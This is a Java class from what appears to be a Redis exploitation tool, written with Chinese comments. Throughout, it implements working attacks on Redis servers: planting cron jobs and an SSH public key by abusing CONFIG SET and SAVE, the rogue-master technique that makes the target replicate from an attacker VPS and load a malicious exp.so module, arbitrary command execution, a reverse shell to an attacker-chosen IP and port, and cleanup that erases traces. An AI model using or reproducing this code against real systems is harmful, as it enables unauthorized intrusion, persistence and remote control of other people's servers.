package Dao;

import Util.Reporter;
import Util.Utils;
import redis.clients.jedis.Jedis;
import redis.clients.jedis.commands.ProtocolCommand;
import redis.clients.jedis.util.SafeEncoder;

import java.sql.SQLException;
import java.util.Arrays;
import java.util.List;


/**
 * CLI 化解耦（M1）：仅换输出口——Controller/TextArea → Reporter。
 * 并发红线修复：原 public static 的 CONN/dir/slaveReadOnlyFlag 改为实例字段
 * （static 使多任务/多连接共享 Jedis 与状态，属于并发正确性缺陷；不得回潮——AGENTS.md §1.5）。
 */
public class RedisDao {

    /**
     * 统一输出口（原 RedisController 日志框；缺省空实现，宿主经 setReporter 注入）
     */
    private Reporter reporter = Reporter.NONE;

    public void setReporter(Reporter reporter) {
        this.reporter = reporter;
    }

    private Jedis CONN;
    private List<String> dir;
    private String slaveReadOnlyFlag = "yes";

    private String ip;
    private int port;
    private String password;
    private int timeout;
    private String OS;
    private String redisVersion;
    private String arch;

    public RedisDao(String ip, String port, String password, String timeout) {
        this.ip = ip;
        this.port = Integer.parseInt(port);
        this.password = password;
        // 毫秒单位
        this.timeout = Integer.parseInt(timeout) * 1000;
    }

    /**
     * 测试是否成功连接上数据库，不需要持久化连接
     *
     * @return
     * @throws SQLException
     */
    public void testConnection() {
        CONN = new Jedis(ip, port, timeout);
        if (password.length() != 0) {
            CONN.auth(password);
        }
        CONN.info();
        if (CONN != null) {
            CONN.close();
        }
    }

    public void getConnection() throws Exception {
        CONN = new Jedis(ip, port, timeout);
        if (password.length() != 0) {
            CONN.auth(password);
        }
    }

    public void closeConnection() throws Exception {
        if (CONN != null) {
            CONN.close();
        }
    }

    /**
     * 供 dispatcher/扫描器取底层连接（只读用途；不得对外静态共享）
     */
    public Jedis jedis() {
        return CONN;
    }

    public void getInfo() throws Exception {
        String info = CONN.info();
        dir = CONN.configGet("dir");
        OS = Utils.regularMatch("os:(.*)", info);
        redisVersion = Utils.regularMatch("redis_version:(.*)", info);
        arch = Utils.regularMatch("arch_bits:(.*)", info);

        reporter.log(Utils.log("当前系统: " + OS));
        reporter.log(Utils.log("当前系统位数: " + arch));
        reporter.log(Utils.log("当前 Redis 版本: " + redisVersion));
        reporter.log(Utils.log("4.x >= Version <= 5.0.5 可使用主从同步请注意查看版本信息"));
        reporter.result(info);
    }

    public void redisavedb(String dir, String dbfilename) {
        CONN.configSet("dir", dir);
        CONN.configSet("dbfilename", dbfilename);
        CONN.save();
    }


    public void redisslave(String vpsIp, String vpsPort) {
        try {
            reporter.log(Utils.log("Setting master: " + vpsIp + ":" + vpsPort));
            // 开启主从
            CONN.slaveof(vpsIp, Integer.parseInt(vpsPort));

        } catch (Exception e) {
            reporter.log(Utils.log(e.getMessage()));
        }
    }


    public void crontab(String cronText) {
        List<String> crondirs = Arrays.asList("/var/spool/cron/", "/var/spool/cron/crontab/", "/var/spool/cron/crontabs/");
        for (String dir : crondirs) {
            try {
                String randomString = Utils.getRandomString();
                CONN.set("xxcron", "\n\n" + cronText + "\n\n");
                CONN.configSet("dir", dir);
                CONN.configSet("dbfilename", randomString);
                CONN.save();
                reporter.log(Utils.log(dir + randomString  + " 写入 CRON " +
                        "计划任务成功！"));
                break;
            } catch (Exception e) {
                reporter.log(Utils.log(" 写入 CRON 计划任务失败！"));
                reporter.log(Utils.log(e.getMessage()));
            }
        }
    }

    public void sshkey(String sshRsa,String Path) {
        try {
            CONN.set("xxssh", "\n\n" + sshRsa + "\n\n");
            CONN.configSet("dir", Path);
            CONN.configSet("dbfilename", "authorized_keys");
            CONN.save();
            reporter.log(Utils.log("写入 SSH 公钥成功！"));
        } catch (Exception e) {
            reporter.log(Utils.log("写入 SSH 公钥失败！"));
            reporter.log(Utils.log(e.getMessage()));
        }

    }

    public void rogue(String vpsip, String vpsport, int timeout) throws Exception {
        redisslave(vpsip, vpsport);

        reporter.log(Utils.log("设置 dbfilename 参数！"));
        List<String> slaveReadOnlyList = CONN.configGet("slave-read-only");
        slaveReadOnlyFlag = slaveReadOnlyList.get(1);

        reporter.log(Utils.log("成功设置 slave-read-only 为 no！"));
        CONN.configSet("slave-read-only", "no");

        // 配置so文件
        CONN.configSet("dbfilename", "exp.so");

        List<String> dir = CONN.configGet("dir");
        String evalpath = dir.get(1) + "/exp.so";

        reporter.log(Utils.log("正在加载模块请稍等..."));
        // 加载恶意so
        Thread.sleep(timeout);
        CONN.moduleLoad(evalpath);
        Thread.sleep(timeout);

        //关闭主从
        CONN.slaveofNoOne();
        reporter.log(Utils.log("模块加载成功!"));

    }

    public enum SysCommand implements ProtocolCommand {
        EVAL("system.exec");

        private final byte[] raw;

        SysCommand(String alt) {
            raw = SafeEncoder.encode(alt);
        }

        @Override
        public byte[] getRaw() {
            return raw;
        }
    }

    public enum SysRevShell implements ProtocolCommand {
        REV_SHELL("system.rev");

        private final byte[] raw;

        SysRevShell(String alt) {
            raw = SafeEncoder.encode(alt);
        }

        @Override
        public byte[] getRaw() {
            return raw;
        }
    }

    public String revShell(String revIp, String revPort) {
        String result = "";
        try {
            CONN.sendCommand(SysRevShell.REV_SHELL, revIp, revPort);
        } catch (Exception e) {
            reporter.error(e.getMessage(), e);
        }
        return result;
    }

    public String eval(String command, String code) {
        String result = "";
        try {
            byte[] bytes = (byte[]) CONN.sendCommand(SysCommand.EVAL, command);
            result = (new String(bytes, code));
        } catch (Exception e) {
            reporter.error(e.getMessage(), e);
        }
        return result;
    }

    /**
     * 1. 清理目录和本地文件持久化位置修改
     * 2. 关闭主从
     * 3. 卸载导入so函数
     */
    public void clean() {
        try {
            CONN.configSet("dir", dir.get(1));
            reporter.log(Utils.log("重设 Dir 参数成功！"));

            CONN.configSet("slave-read-only", slaveReadOnlyFlag);
            reporter.log(Utils.log("重设 slave-read-only 成功！"));
            CONN.configSet("dbfilename", "dump.rdb");
            reporter.log(Utils.log("重设 dbfilename 参数成功！"));
            CONN.slaveofNoOne();
            reporter.log(Utils.log("重设 slaveof 成功"));
            eval("rm -f " + dir.get(1) + "/exp.so", "UTF-8");
            reporter.log(Utils.log("删除 exp 提权模块成功！"));
            CONN.moduleUnload("system");
            reporter.log(Utils.log("卸载函数成功！"));
            CONN.del("xxssh");
            CONN.del("xxcron");
            reporter.log(Utils.log("删除 Key 成功！"));
        } catch (Exception e) {
            reporter.error(e.getMessage(), e);
        }
    }

    // ---- 只读状态访问器（CLI dispatcher 结构化 info / CVE 扫描用；不影响既有行为） ----
    public String getOs() {
        return OS;
    }

    public String getRedisVersion() {
        return redisVersion;
    }

    public String getArch() {
        return arch;
    }

    /**
     * 取 configGet("dir") 原始返回（0=key,1=value）；供 clean 之外的场景核对持久化配置
     */
    public List<String> getDirConfig() {
        return dir;
    }

    public String getSlaveReadOnlyFlag() {
        return slaveReadOnlyFlag;
    }

}
